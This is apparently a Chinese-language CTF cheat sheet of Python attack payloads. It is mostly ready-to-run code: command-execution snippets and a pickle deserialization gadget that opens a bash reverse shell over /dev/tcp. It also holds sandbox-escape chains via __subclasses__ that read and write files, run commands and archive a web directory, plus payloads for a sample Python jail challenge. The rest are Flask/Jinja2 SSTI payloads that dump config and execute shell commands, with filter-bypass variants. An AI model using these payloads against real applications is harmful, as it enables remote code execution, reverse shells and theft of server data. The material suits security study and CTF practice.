## 命令执行
```py
import platform
platform.popen('ipconfig').read()

import subprocess
subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE,stderr=subprocess.STDOUT).stdout.read()

import os
os.system('ls')
```
## 反弹shell
```py
#!/usr/bin/env python
# encoding: utf-8
import os
import pickle
class test(object):
    def __reduce__(self):
        code='bash -c "bash -i >& /dev/tcp/127.0.0.1/12345 0<&1 2>&1"'
        return (os.system,(code,))
a=test()
c=pickle.dumps(a)
print c
pickle.loads(c)
```
## 沙盒绕过
```py
# read 函数，读文件
().__class__.__bases__[0].__subclasses__()[40]('abc.php').read()
# write 函数，写文件
().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
# 执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()' )
# 通过 system 执行任意命令
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('id')
# 通过 popen 执行任意命令
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('id').read()
# 打包文件
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('tar -czvf /tmp/www.tar.gz /home/ctf/www').read()
# base64 编码读取文件
().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('base64 /tmp/www.tar.gz').read()
```
题目:
```py
#!/usr/bin/python2.7 -u

from sys import modules
modules.clear()
del modules

_raw_input = raw_input
_BaseException = BaseException
_EOFError = EOFError

__builtins__.__dict__.clear()
__builtins__ = None

print 'Get a shell, if you can...'

while 1:
    try:
        d = {'x':None}
        exec 'x='+_raw_input()[:50] in d
        print 'Return Value:', d['x']
    except _EOFError, e:
        raise e
    except _BaseException, e:
        print 'Exception:', e
```
payloads:
```py
data = [
    """1;__builtins__['a']=[].__class__.__base__""",
    """1;__builtins__['b']=a.__subclasses__()[59]""",
    """1;__builtins__['c']=b.__init__.__globals__""",
    """1;__builtins__['d']=c['linecache'].__dict__""",
    """1;__builtins__['e']=d['os'].system""",
    """1;x=e('ls')""",
]
```
## 格式化字符串漏洞
```py
class User(object):
    def __init__(self, name):
        self.name = name

# a == joe
input_t = '{0.name}'
a = input_t.format(User('joe'))

# a == joe
input_t = '{user.name}'
a = input_t.format(user=User('joe'))
```

## flask/Jinja2 ssti
### 读配置

```
#配置
{{config}}
# 对象字典
{{request.environ}}
{{url_for.__globals__['current_app'].config}}
{{get_flashed_messages.__globals__['current_app'].config}}
```

```
{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls -r /*/*").read()')}}
```
### 命令执行
```
{% for c in [].__class__.__base__.__subclasses__() %}
 {% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.func_globals.values() %} 
  {% if b.__class__ == {}.__class__ %} {% if 'eval' in b.keys() %} {{ b['eval']('__import__("os").popen("ls").read()') }} 
  {% endif %}
   {% endif %} 
   {% endfor %} 
   {% endif %} 
   {% endfor %} 
  ```

### 绕过过滤
```py
{(''|attr('__class__')}}，{(''['__class__'])}}
# 等价于
{{''.__class__}}
```

### cookie生成，解码
https://github.com/noraj/flask-session-cookie-manager